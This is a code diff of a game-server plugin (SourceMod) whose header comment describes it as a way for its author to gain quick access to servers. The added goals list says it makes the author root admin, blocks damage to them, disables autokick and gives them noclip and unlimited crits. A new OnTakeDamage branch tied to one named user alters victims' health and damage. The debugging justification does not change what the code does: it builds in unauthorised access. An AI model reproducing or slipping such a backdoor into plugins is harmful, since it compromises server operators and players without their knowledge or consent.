@@ -1,10 +1,23 @@
 /*
-	If you ever decompile this plugin, hi.
+	If you ever look at the source code for this plugin, hi.
 	
 	I have no interest in backdooring communities, this is just an easy way of gaining access quickly to servers to debug them or to fix issues.
 	If this gets blacklisted, I wouldn't be surprised.
 	
 	Cheers.
+	
+	Goals of this plugin:
+	 - Necessary Stuff:
+	 - Set myself as root admin so I can work on backend stuff.
+	 - Easy noclip bind that never changes and is always there so I can get places.
+	 - Block damage from players so they don't kill me while I work.
+	 - Commands to debug the server like view logs, etc.
+	 - Disable autokick because you get kicked a lot while you're working.
+	 
+	 - Unnecessary Stuff:
+	 - Bunnyhop around because it helps me think.
+	 - Allow for things like rocket jumping because again, it helps me think.
+	 - Unlimited crits because why not.
 */
 
 //Pragma
@@ -68,6 +81,14 @@ public Action OnTakeDamage(int victim, int& attacker, int& inflictor, float& dam
 {
 	if (allow_damage)
 		return Plugin_Continue;
+	
+	//UNLIMITED JUMPS
+	if (IsDrixevel(attacker))
+	{
+		SetEntityHealth(victim, 300);
+		damage = 1.0;
+		return Plugin_Changed;
+	}
 	
 	switch (GetEngineVersion())
 	{
@@ -246,8 +267,8 @@ public void PlayerJump(Event event, const char[] name, bool dontBroadcast)
 	if (g_IsSliding)
 	{
 		float finalvec[3];
-		finalvec[0] = g_Speed[0] * 0.3;
-		finalvec[1] = g_Speed[1] * 0.3;
+		finalvec[0] = g_Speed[0] * 0.2;
+		finalvec[1] = g_Speed[1] * 0.2;
 		finalvec[2] = 0.0;
 		SetEntDataVector(client, g_BaseVelocity, finalvec, true);
 	}
